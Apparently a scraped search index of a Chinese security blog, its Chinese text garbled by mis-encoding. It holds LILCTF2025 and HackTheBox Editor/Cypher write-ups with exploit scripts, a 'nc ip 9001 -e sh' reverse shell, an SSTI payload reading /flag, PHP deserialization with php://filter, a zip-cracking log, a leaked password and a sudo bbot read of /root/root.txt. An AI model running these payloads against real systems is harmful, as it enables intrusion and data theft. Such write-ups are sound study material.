print(f\"Warning: Character '{char_var}' not found in variable map.\") if num_str: try: # å°†æ‹¼æ¥å¥½çš„æ•°å­—å­—ç¬¦ä¸²è½¬ä¸ºæ•´æ•°ï¼Œå†è½¬ä¸ºASCIIå­—ç¬¦ decoded_command += chr(int(num_str)) except ValueError: print(f\"Warning: Could not convert '{num_str}' to an integer.\") print(\"[+] Step 1 complete. Deobfuscated PowerShell command:\") print(\"-\" * 50) print(decoded_command) print(\"-\" * 50) # 3. ä»è§£å¯†åçš„å‘½ä»¤ä¸­æå–Base64å­—ç¬¦ä¸² print(\"\\n[+] Step 2: Extracting Base64 encoded payload from the command...\") # ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼æŸ¥æ‰¾ Base64 å­—ç¬¦ä¸² match = re.search(r\"::FromBase64String\\('([^']+)'\\)\", decoded_command) if not match: print(\"[-] Error: Could not find the Base64 string in the deobfuscated command.\") return base64_payload = match.group(1) print(f\"[+] Found Base64 payload (starts with: '{base64_payload[:20]}...').\") # 4. è§£ç Base64å¹¶ä¿å­˜ä¸ºæ–‡ä»¶ print(\"\\n[+] Step 3: Decoding Base64 and saving the .NET assembly...\") try: assembly_bytes = base64.b64decode(base64_payload) # éªŒè¯æ–‡ä»¶å¤´ (MZ)ï¼Œç¡®è®¤æ˜¯å¯æ‰§è¡Œæ–‡ä»¶ if assembly_bytes.startswith(b'MZ'): print(\"[+] Payload is a valid Windows executable (MZ header found).\") output_filename = \"payload.dll\" with open(output_filename, \"wb\") as f: f.write(assembly_bytes) print(f\"[+] Successfully saved the .NET assembly as '{output_filename}'.\") # 5. æä¾›ä¸‹ä¸€æ­¥æŒ‡ç¤º print(\"\\n[+] Final Step: Manual Analysis\") print(\"The flag is located inside the extracted 'payload.dll' file.\") print(\"To find it, you need a .NET decompiler. Follow these steps:\") print(\" 1. Download and open a decompiler like 'dnSpy' or 'ILSpy'.\") print(\" 2. Open the 'payload.dll' file in the decompiler.\") print(\" 3. Navigate to the class 'FVVwzcy.kF'.\") print(\" 4. Find and examine the method named 'QF'.\") print(\" 5. The flag will be visible inside this method's code.\") except base64.binascii.Error as e: print(f\"[-] Error: Failed to decode Base64 string. {e}\") except Exception as e: print(f\"[-] An unexpected error occurred: {e}\") if __name__ == '__main__': # å°†é¢˜ç›®ä¸­çš„é•¿å­—ç¬¦ä¸²ç²˜è´´åˆ°è¿™é‡Œ obfuscated_payload = \"z$x+...ï¼ˆè¿™é‡Œçœç•¥äº†é¢˜ç›®ä¸­çš„è¶…é•¿å­—ç¬¦ä¸²ï¼‰...i+g$b$u$i\" # ä¸ºäº†è¿è¡Œï¼Œè¯·å°†ä¸Šé¢è¿™è¡Œæ›¿æ¢ä¸ºå®Œæ•´çš„æ··æ·†å­—ç¬¦ä¸² # ç¤ºä¾‹ï¼ˆåªåŒ…å«å‰å‡ ä¸ªå­—ç¬¦ç”¨äºæ¼”ç¤ºï¼‰ obfuscated_payload =\"\" # ç”±äºåŸå§‹å­—ç¬¦ä¸²å¤ªé•¿ï¼Œè¿™é‡Œæˆ‘ä»¬ç”¨ä¸€ä¸ªæˆªæ–­çš„å ä½ç¬¦ # åœ¨å®é™…ä½¿ç”¨æ—¶ï¼Œè¯·ç¡®ä¿æ›¿æ¢ä¸ºå®Œæ•´çš„å­—ç¬¦ä¸² if \"...\" in obfuscated_payload: print(\"Please replace the placeholder payload with the full obfuscated string from the challenge.\") else: # æ¸…ç†å˜é‡å‰çš„ '$' ç¬¦å· cleaned_payload = obfuscated_payload.replace('$', '') solve_powershell_obfuscation(cleaned_payload) ","date":"2025-08-18","objectID":"/lilctf2025/:4:2","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Web(zsm\u0026bananas) ","date":"2025-08-18","objectID":"/lilctf2025/:5:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Ekko_note å…ˆçœ‹çœ‹æºç ï¼Œå‘ç°å‘½ä»¤æ‰§è¡Œå¯ä»¥å¼¹shellï¼Œuuid8çš„seedè¢«randomè¦†ç›–æ‰äº†ï¼Œå…ˆæ‹¿åˆ°æ—¶é—´æˆ³ï¼Œåœ¨server_infoæ¥å£ï¼Œç„¶åç”Ÿæˆtokenï¼Œè¿™é‡Œpyenvå®‰è£…py3.14dev import random import time import uuid SERVER_START_TIME = 1755269036.9640567 # \u003c--- æ›¿æ¢æˆä½ è·å–åˆ°çš„å€¼ def padding(input_string): byte_string = input_string.encode('utf-8') if len(byte_string) \u003e 6: byte_string = byte_string[:6] padded_byte_string = byte_string.ljust(6, b'\\x00') padded_int = int.from_bytes(padded_byte_string, byteorder='big') return padded_int random.seed(SERVER_START_TIME) admin_username = 'admin' padded_admin_int = padding(admin_username) predicted_token = str(uuid.uuid8(a=padded_admin_int)) print(f\"Server Start Time Seed: {SERVER_START_TIME}\") print(f\"Admin's Padded Integer: {padded_admin_int}\") print(f\"The One and Only Predicted Token: {predicted_token}\") ç„¶åæ›´æ”¹adminçš„å¯†ç ï¼Œç„¶åwebhookå¼€ä¸€ä¸ªï¼Œæ—¶é—´jsonæ”¹æˆ{â€œdateâ€: â€œ2067-08-15T12:00:00â€}ï¼Œå¤åˆ¶urlå¡«åˆ°é¢˜ç›®çš„apiï¼Œç„¶ånc ip 9001 -e shå¼¹shellï¼Œæ ¹ç›®å½•ä¸‹flag ","date":"2025-08-18","objectID":"/lilctf2025/:5:1","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"EZ_bottle é€šè¿‡é¢˜ç›®å¾ˆæ˜æ˜¾çš„çœ‹åˆ°è¿™æ˜¯bottleæ¡†æ¶ä¸‹çš„SSTIï¼Œé€šè¿‡ä¸Šä¼ zipæ–‡ä»¶ï¼Œç„¶åè§£å‹zipæ–‡ä»¶å¯¹é‡Œé¢æ–‡ä»¶çš„å†…å®¹è¿›è¡Œæ¸²æŸ“ã€‚ä½†æ˜¯åŠæ‰äº†{}å’Œ\u003c%%\u003e,é‚£ä¹ˆæˆ‘ä»¬å°±åªèƒ½é€šè¿‡%0a%%20æ¥è¿›è¡ŒSSTIï¼Œä¸€å¼€å§‹çš„æ—¶å€™å¹¶ä¸é¡ºåˆ©ï¼Œå› ä¸ºæ— è®ºæ€ä¹ˆæ ·éƒ½æ— æ³•å›æ˜¾ï¼Œä»¥ä¸ºæ˜¯æ— å›æ˜¾ï¼Œå°è¯•æ— æœåä»”ç»†æƒ³æƒ³ï¼Œä¹‹æ‰€ä»¥æ²¡æœ‰å›æ˜¾å¯èƒ½æ˜¯å› ä¸ºå›æ˜¾éƒ½å­˜è¿›æŠ¥é”™ä¿¡æ¯é‡Œäº†ï¼Œæ‰€ä»¥æˆ‘ä»¬åªéœ€è¦æƒ³åŠæ³•è¯»å–æŠ¥é”™ä¿¡æ¯å°±å¯ä»¥å°†flagå¸¦å¤–å‡ºæ¥ ä¸Šä¼ è„šæœ¬å¦‚ä¸‹ import requests import zipfile import os # é…ç½®ä¿¡æ¯ source_file = \"2.tpl\" # è¦å‹ç¼©çš„æ–‡ä»¶ zip_file = \"temp.zip\" # ä¸´æ—¶zipæ–‡ä»¶ upload_url = \"http://challenge.xinshi.fun:42366/upload\" # åˆ›å»ºzipæ–‡ä»¶ with zipfile.ZipFile(zip_file, 'w') as zf: zf.write(source_file) # ä¸Šä¼ æ–‡ä»¶ with open(zip_file, 'rb') as f: res=requests.post(upload_url, files={'file': (zip_file, f)}) print(res.text) # æ¸…ç†ä¸´æ—¶æ–‡ä»¶ os.remove(zip_file) ç„¶åç¼–å†™çš„SSTIæ–‡ä»¶å¦‚ä¸‹ % raise Exception(Âºpen(â€™/flagâ€™).read()) openå‡½æ•°å› ä¸ºè¢«åŠæ‰äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨ä¹‹å‰XYCTF2025ä¸­å­¦åˆ°çš„æ–œä½“å­—è¿›è¡Œç»•è¿‡å³å¯è¯»å–åˆ°flag ","date":"2025-08-18","objectID":"/lilctf2025/:5:2","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Your Uns3r å¯ä»¥çœ‹åˆ°æœ‰ä¸ªincludeå‡½æ•°å¯ä»¥ç”¨ä½œä»»æ„æ–‡ä»¶è¯»å–ï¼Œå› æ­¤æ¥ä¸‹æ¥çš„ç›®æ ‡å°±æ˜¯æ„é€ getTokençš„å†…å®¹ ç„¶åå®¡è®¡getTokenå‘ç°ï¼Œæˆ‘ä»¬åªè¦æ„é€ resultå°±å¯ä»¥å®ç°ä»»æ„æ–‡ä»¶è¯»å– å¾€ä¸‹çœ‹èƒ½çœ‹è§æœ‰ä¸€ä¸ªwafæ‹¦æˆª å¯ä»¥çœ‹åˆ°æœ‰ä¸ªé€»è¾‘æ¼æ´ï¼Œè¿™é‡Œç”¨çš„æ˜¯ä¸å…³ç³»ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œä¸¤ä¸ªåˆ¤å®šæ¡ä»¶åªè¦æœ‰ä¸€ä¸ªä¸æˆç«‹ï¼Œè¿™ä¸ªwafå°±å®Œå…¨æ²¡æœ‰æ•ˆæœã€‚çœ‹å‘ç¬¬ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­ï¼Œusernameç­‰äºadminæ˜¯å¼±æ¯”è¾ƒï¼Œå¯ä»¥ä½¿ç”¨username=0æ¥è¿›è¡Œç»•è¿‡ å¯ä»¥çœ‹åˆ°æ˜¯æˆç«‹çš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬username=adminè¿™ä¸€å—ä¸æˆç«‹çš„è¯ï¼ŒAccesså°±æ²¡å¿…è¦å»ç»•è¿‡äº†ã€‚ æ¥ä¸‹æ¥å¯ä»¥çœ‹åˆ°ï¼ŒgetTokenè¿™ä¸ªç±»é‡Œå¤´æœ‰ä¸€ä¸ªlilctfçš„æ‹¼æ¥ï¼Œè¿™é‡Œä½¿ç”¨ä¼ªåè®®php://filter/convert.base64-encode/xxxxx/resource=xxx, é€šè¿‡ä¼ªåè®®çš„åœ¨encodeå’Œresourceä¹‹å‰æ·»åŠ ä»»ä½•ä¸œè¥¿ï¼Œç»“æœä¸å˜çš„ç‰¹æ€§ï¼Œå³å¯ç»•è¿‡è¿™ä¸ªæ·»åŠ æ•ˆæœã€‚ ç„¶åå°±æ˜¯å¯ä»¥çœ‹åˆ°æœ€åä¸€è¡Œæœ‰ä¸€ä¸ªGCå›æ”¶ï¼Œè¿™ä¸ªç›´æ¥ä½¿ç”¨æ•°ç»„ç»•è¿‡å³å¯ throw new Exception(\"nonono!!!\"); æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥æ„é€ å¦‚ä¸‹Payload \u003c?php class User { public $username = 0; public $value; } class Access { protected $prefix; protected $suffix; public function __construct() { $this-\u003eprefix = 'php://filter/convert.base64-encode/'; $this-\u003esuffix = '/resource=../../../../../flag'; } } $access = new Access(); $user = new User(); $user-\u003evalue = serialize($access); $payload=array($user,0); echo serialize($payload); ","date":"2025-08-18","objectID":"/lilctf2025/:5:3","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"Misc(emm\u0026clubsspades) ","date":"2025-08-18","objectID":"/lilctf2025/:6:0","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"æ˜¯è°æ²¡æœ‰é˜…è¯»å‚èµ›é¡»çŸ¥ï¼Ÿ f12æœä¸€ä¸‹ ","date":"2025-08-18","objectID":"/lilctf2025/:6:1","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"væˆ‘50(R)MB é¢˜ç›®è¿›å»åå¯¹æºç å®¡è®¡å‘ç°å¤´åƒå¤„æ˜¯ä¸€å¼ webpæ ¼å¼çš„å›¾ç‰‡ä½†æ˜¯å‘ç°å›¾ç‰‡ä¸å…¨ï¼Œç”¨010æŸ¥çœ‹å‘ç°å›¾ç‰‡å…¶å®åº”è¯¥æ˜¯pngæ ¼å¼çš„ï¼Œå¹¶ä¸”å‘ç°å›¾ç‰‡å¹¶ä¸å…¨ ç„¶åå¯¹ç½‘ç»œè¿›è¡Œå®¡è®¡å‘ç°å›¾ç‰‡æ˜¯é ä¸€ä¸ªapiæ¥å£åŠ è½½å‡ºæ¥çš„ï¼Œä½¿ç”¨burpsuiteå®¡è®¡è¿™ä¸ªæ¥å£ å‘ç°acceptç”³è¯·è¿‡webpï¼Œå› ä¸ºåŸå›¾ç‰‡æ˜¯pngï¼Œå¯ä»¥å°è¯•æŠŠacceptä¸­çš„é™¤äº†apngéƒ¨åˆ†éƒ½åˆ æ‰ï¼Œçœ‹è§pngå°¾å·´äº†ï¼Œcurlä¸‹æ¥ ","date":"2025-08-18","objectID":"/lilctf2025/:6:2","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"PNG Master 010æŸ¥çœ‹ï¼Œæ–‡ä»¶å°¾å¤šä½™æ•°æ®å¾—åˆ°flag1.ï¼ˆå¹¶ä¸”è§‚å¯Ÿåˆ°æ ¹æ®pngæ¨¡æ¿è¿è¡Œç»“æœå¤šäº†ä¸€ä¸ªIDATå—ï¼ŒçŒœæµ‹zlibéšå†™ï¼‰ Stegsolve rgbä¸‰é€šé“ç½®é›¶å¾—åˆ°flag2. å°è¯•zstegå·¥å…·ä¸€æŠŠæ¢­ï¼Œä¸‰ä¸ªéšå†™ä¸€ç›®äº†ç„¶ã€‚ç„¶åå°†IDATå—çš„æ•°æ®æå–å‡ºæ¥ç”¨cyberchefè§£ï¼Œå¾—åˆ°hintå’Œsecret.bin ï¼Œhintæ˜¯é›¶å®½å­—ç¬¦éšå†™ï¼Œå†™ä¸ªè„šæœ¬è·‘ä¸€ä¸‹å¾—åˆ°flag3 ","date":"2025-08-18","objectID":"/lilctf2025/:6:3","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["CTF"],"content":"æå‰æ”¾å‡ºé™„ä»¶ é‚£é“é¢˜å‘ç°å‹ç¼©æ–¹å¼å’ŒåŠ å¯†ç®—æ³•æ˜¯å¯ä»¥æ˜æ–‡çš„ï¼Œåˆ†ææ–‡ä»¶ï¼Œ å‘ç°æ˜¯tarï¼Œçœ‹æ–‡ä»¶åçŒœæµ‹è¢«å½’æ¡£çš„å¯èƒ½æ˜¯flagæˆ–è€…æ˜¯flag.txtï¼Œæ‰‹å·¥åšä¸¤ä¸ªtarçš„æ–‡ä»¶å¤´ ç”¨bkcrackè¿›è¡Œæ˜æ–‡æ”»å‡» .\\bkcrack.exe -C 1.zip -c flag.tar -p flag.tar bkcrack 1.7.0 - 2024-05-26 [20:06:13] Z reduction using 7 bytes of known plaintext 100.0 % (7 / 7) [20:06:13] Attack on 831507 Z values at index 6 Keys: 945815e7 4e7a2163 e46b8f88 79.2 % (658949 / 831507) Found a solution. Stopping. You may resume the attack with the option: --continue-attack 658949 [20:10:33] Keys 945815e7 4e7a2163 e46b8f88 .\\bkcrack.exe -C 1.zip -k 945815e7 4e7a2163 e46b8f88 -u .\\2.zip 1234 bkcrack 1.7.0 - 2024-05-26 Arguments error: unknown option -u. Run 'bkcrack -h' for help. .\\bkcrack.exe -C 1.zip -k 945815e7 4e7a2163 e46b8f88 -U .\\2.zip 1234 bkcrack 1.7.0 - 2024-05-26 [20:12:29] Writing unlocked archive .\\2.zip with password \"1234\" 100.0 % (1 / 1) Wrote unlocked archive. æŠŠå¯†ç æ”¹æˆ1234ï¼Œç›´æ¥å°±æ‹¿åˆ°flagäº† ","date":"2025-08-18","objectID":"/lilctf2025/:6:4","tags":["crypto"],"title":"LILCTF2025","uri":"/lilctf2025/"},{"categories":["é¶åœº"],"content":"HTB,Editor,Cypher","date":"2025-08-12","objectID":"/htb-editorcypher/","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"Editor ","date":"2025-08-12","objectID":"/htb-editorcypher/:0:0","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ rustscanä¸çŸ¥é“ä¸ºä»€ä¹ˆæ‰«ä¸å‡ºæ¥8080ï¼Œæ„Ÿè§‰è¢«èµ„æœ¬åšå±€äº† nmap -sC -sV -Pn -p- 10.10.11.80 --min-rate=5000 Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-08-05 13:06 CST Nmap scan report for 10.10.11.80 Host is up (0.11s latency). Not shown: 52865 filtered tcp ports (no-response), 12667 closed tcp ports (conn-refused) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA) |_ 256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519) 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Did not follow redirect to http://editor.htb/ |_http-server-header: nginx/1.18.0 (Ubuntu) 8080/tcp open http Jetty 10.0.20 | http-cookie-flags: | /: | JSESSIONID: |_ httponly flag not set | http-title: XWiki - Main - Intro |_Requested resource was http://10.10.11.80:8080/xwiki/bin/view/Main/ | http-robots.txt: 50 disallowed entries (15 shown) | /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ | /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ | /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ | /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ | /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ |_/xwiki/bin/undelete/ | http-webdav-scan: | WebDAV type: Unknown | Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK |_ Server Type: Jetty(10.0.20) |_http-server-header: Jetty(10.0.20) | http-methods: |_ Potentially risky methods: PROPFIND LOCK UNLOCK |_http-open-proxy: Proxy might be redirecting requests Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 106.22 seconds å…ˆæŠŠåŸŸååŠ è¿›å»ï¼Œç„¶åè®¿é—®80å‘ç°ä»€ä¹ˆéƒ½æ²¡æœ‰broï¼Œçœ‹çœ‹8080ï¼Œå‘ç°äº†xwikiè¿™ä¸ªè¯ ç›´æ¥åœ¨ç½‘ä¸Šæœä¸€ä¸‹ï¼Œæ‰¾åˆ°CVE ","date":"2025-08-12","objectID":"/htb-editorcypher/:1:0","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"å†…ç½‘ ","date":"2025-08-12","objectID":"/htb-editorcypher/:2:0","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"åˆ‡æ¢ç”¨æˆ· è¿›å»ä¹‹åçœ‹è§äº†ä¸€å †æ•°æ®åº“æ–‡ä»¶ï¼Œä¸”æœ¬åœ°æœ‰mysqlï¼Œç¬¬ä¸€æƒ³æ³•æ˜¯æ‰¾åˆ°æ•°æ®åº“å¯†ç ï¼Œæ•°æ®åº“é‡Œé¢ä¼°è®¡æœ‰å…¶ä»–çš„è´¦å·ä¿¡æ¯ å°è¯•ä¹‹åæ— æœï¼Œåªå¾—åˆ°äº†ä¸€ä¸ªå¯ä»¥ç™»é™†æ•°æ®åº“çš„å¯†ç theEd1t0rTeam99 ç„¶åçªå‘å¥‡æƒ³broï¼Œcat /etc/passwdçœ‹è§äº†ä¸€å †ç”¨æˆ·ï¼Œç›´æ¥ä¸€ä¸ªä¸€ä¸ªè¯•ï¼Œå½“ç„¶äº†hydraå¯ä»¥å¿«é€Ÿå–·æ´’ï¼Œè¿™é‡Œå¯ä»¥ç”¨oliverè¿™ä¸ªç”¨æˆ·ç™»é™†ä¸Šå» ","date":"2025-08-12","objectID":"/htb-editorcypher/:2:1","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"ææƒ è¿›å»ä¹‹åidçœ‹çœ‹ï¼Œç»“æœå‘ç°netdataï¼Œç½‘ä¸Šæœä¸€ä¸‹cveï¼Œæ‰¾åˆ°cveäº†xdï¼Œç›´æ¥æ‰“å°±è¡Œäº†ï¼Œéå¸¸çš„ç®€å• å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œé¶æœºæ˜¯x86çš„ï¼Œæˆ‘macçš„armç›´æ¥åºŸæ‰äº†ï¼Œæˆ‘å“­æ­» Cypher ","date":"2025-08-12","objectID":"/htb-editorcypher/:2:2","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"å¤–ç½‘æ‰“ç‚¹ nmap -sC -sV -Pn 10.10.11.57 â”€â•¯ Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-30 10:52 CST Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 99.99% done; ETC: 10:53 (0:00:00 remaining) Stats: 0:01:09 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan SYN Stealth Scan Timing: About 99.99% done; ETC: 10:54 (0:00:00 remaining) Nmap scan report for 10.10.11.57 Host is up (0.11s latency). Not shown: 998 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 9.6p1 Ubuntu 3ubuntu13.8 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA) |_ 256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519) 80/tcp open http nginx 1.24.0 (Ubuntu) |_http-server-header: nginx/1.24.0 (Ubuntu) |_http-title: Did not follow redirect to http://cypher.htb/ Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 90.02 seconds dirsearch -u http://cypher.htb/ â”€â•¯ /usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html from pkg_resources import DistributionNotFound, VersionConflict _|. _ _ _ _ _ _|_ v0.4.3 (_||| _) (/_(_|| (_| ) Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 25 | Wordlist size: 11460 Output File: /home/zsm/reports/http_cypher.htb/__25-03-30_10-57-11.txt Target: http://cypher.htb/ [10:57:11] Starting: [10:57:23] 200 - 5KB - /about [10:57:23] 200 - 5KB - /about.html [10:57:31] 404 - 22B - /api.log [10:57:31] 404 - 22B - /api-docs [10:57:31] 307 - 0B - /api/ -\u003e http://cypher.htb/api/api [10:57:31] 404 - 22B - /api/2/explore/ [10:57:31] 307 - 0B - /api -\u003e /api/docs [10:57:31] 404 - 22B - /api-doc [10:57:31] 404 - 22B - /api.py [10:57:31] 404 - 22B - /api/batch [10:57:31] 404 - 22B - /api.php [10:57:31] 404 - 22B - /api/__swagger__/ [10:57:31] 404 - 22B - /api/2/issue/createmeta [10:57:31] 404 - 22B - /api/cask/graphql [10:57:31] 404 - 22B - /api/_swagger_/ [10:57:31] 404 - 22B - /api/api [10:57:31] 404 - 22B - /api/api-docs [10:57:32] 404 - 22B - /api/apidocs/swagger.json [10:57:32] 404 - 22B - /api/docs [10:57:32] 404 - 22B - /api/application.wadl [10:57:32] 404 - 22B - /api/apidocs [10:57:32] 404 - 22B - /api/docs/ [10:57:32] 404 - 22B - /api/config [10:57:32] 404 - 22B - /api/jsonws [10:57:32] 404 - 22B - /api/snapshots [10:57:32] 404 - 22B - /api/profile [10:57:32] 404 - 22B - /api/error_log [10:57:32] 404 - 22B - /api/swagger [10:57:32] 404 - 22B - /api/login.json [10:57:32] 404 - 22B - /api/jsonws/invoke [10:57:32] 404 - 22B - /api/proxy [10:57:32] 404 - 22B - /api/package_search/v4/documentation [10:57:32] 404 - 22B - /api/spec/swagger.json [10:57:32] 404 - 22B - /api/swagger.yaml [10:57:32] 404 - 22B - /api/swagger.json [10:57:32] 404 - 22B - /api/swagger/ui/index [10:57:32] 404 - 22B - /api/v1/swagger.json [10:57:32] 404 - 22B - /api/swagger/swagger [10:57:32] 404 - 22B - /api/swagger.yml [10:57:32] 404 - 22B - /api/v1/ [10:57:32] 404 - 22B - /api/timelion/run [10:57:32] 404 - 22B - /api/v1 [10:57:32] 404 - 22B - /api/v2 [10:57:32] 404 - 22B - /api/v1/swagger.yaml [10:57:32] 404 - 22B - /api/v2/ [10:57:32] 404 - 22B - /api/v2/swagger.json [10:57:32] 404 - 22B - /api/v2/helpdesk/discover [10:57:32] 404 - 22B - /api/v2/swagger.yaml [10:57:32] 404 - 22B - /api/whoami [10:57:32] 404 - 22B - /apibuild.pyc [10:57:32] 404 - 22B - /api/v3 [10:57:32] 404 - 22B - /apidoc [10:57:32] 404 - 22B - /api/v4 [10:57:32] 404 - 22B - /apiserver-key.pem [10:57:32] 404 - 22B - /api/vendor/phpunit/phpunit/phpunit [10:57:32] 404 - 22B - /apiserver-client.crt [10:57:32] 404 - 22B - /apiserver-aggregator-ca.cert [10:57:32] 404 - 22B - /apiserver-aggregator.cert [10:57:32] 404 - 22B - /apis [10:57:32] 404 - 22B - /apidocs [10:","date":"2025-08-12","objectID":"/htb-editorcypher/:3:0","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é¶åœº"],"content":"å†…ç½‘ææƒ graphasm@cypher:~$ sudo -l Matching Defaults entries for graphasm on cypher: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin, use_pty User graphasm may run the following commands on cypher: (ALL) NOPASSWD: /usr/local/bin/bbot graphasm@cypher:~$ cat /usr/local/bin/bbot #!/opt/pipx/venvs/bbot/bin/python # -*- coding: utf-8 -*- import re import sys from bbot.cli import main if __name__ == '__main__': sys.argv[0] = re.sub(r'(-script\\.pyw|\\.exe)?$', '', sys.argv[0]) sys.exit(main()) graphasm@cypher:/usr/local/bin$ sudo /usr/local/bin/bbot -cy /root/root.txt â€“debug ç›´æ¥å¢åŠ è§„åˆ™ï¼Œç„¶åè°ƒè¯•ï¼Œå½¢æˆè¯»å–æ–‡ä»¶çš„æƒ…å†µ ","date":"2025-08-12","objectID":"/htb-editorcypher/:4:0","tags":["æ¸—é€"],"title":"HTB Editor\u0026Cypher","uri":"/htb-editorcypher/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"shell,zsh,kitty,zinit,nvim","date":"2025-08-04","objectID":"/terminal-configuration/","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"å‰è¨€ æœ€è¿‘çœ‹äº†ä¸€äº›å…³äºç»ˆç«¯çš„è§†é¢‘ï¼Œå¿ƒè¡€æ¥æ½®ï¼Œæ‰€ä»¥è‡ªå·±ä¹Ÿæ›´æ–°ä¸€ä¸‹æˆ‘çš„é…ç½®å’Œè½¯ä»¶ï¼Œæ­£å¥½æ„Ÿè§‰iterm2æœ‰ç‚¹è€ä¸”å¡ ","date":"2025-08-04","objectID":"/terminal-configuration/:1:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"kitty ä¸€ä¸ªå°åº¦ä½¬å¼€å‘çš„ç»ˆç«¯æ¨¡æ‹Ÿå™¨ï¼Œéå¸¸çš„nbï¼Œçœ‹äº†ä¸€ä¸‹ï¼Œæ˜¯go\u0026python\u0026cæ··åˆå¼€å‘çš„ï¼Œæ€§èƒ½ä¹Ÿæ˜¯éå¸¸çš„å¥½ï¼Œæ‰€ä»¥è¿™é‡Œæ¢æˆkitty. ","date":"2025-08-04","objectID":"/terminal-configuration/:2:0","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"åŸºç¡€é…ç½® brew install kitty #é€‰å­—ä½“ï¼Œæˆ‘çš„å­—ä½“æ˜¯githubé‚£ä¸ª+nerdå›¾æ ‡è‡ªæ„çš„ï¼Œæ‰€ä»¥è¿™æ ·æ–¹ä¾¿ä¸€ç‚¹ kitten choose-fonts #é€‰ä¸»é¢˜ kitty +kitten themes è¿™æ ·æ“ä½œä¹‹åï¼Œå‹‰å¼ºèƒ½çœ‹äº†broã€‚ ","date":"2025-08-04","objectID":"/terminal-configuration/:2:1","tags":["ç»ˆç«¯"],"title":"Terminal Configuration","uri":"/terminal-configuration/"},{"categories":["é…ç½®","æ‚è°ˆ"],"content":"äºŒæ¬¡é…ç½® kittyçš„é…ç½®æ–‡ä»¶åœ¨~/.config/kitty/ä¸‹ï¼Œæ–°å»ºä¸€ä¸ªkitty.confï¼Œä¸çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘çš„ä¸»é¢˜æ²¡æœ‰å¯¼å…¥è¿›å»ï¼Œè‡ªå·±æ‰‹å†™ä¸€ä¸‹ include 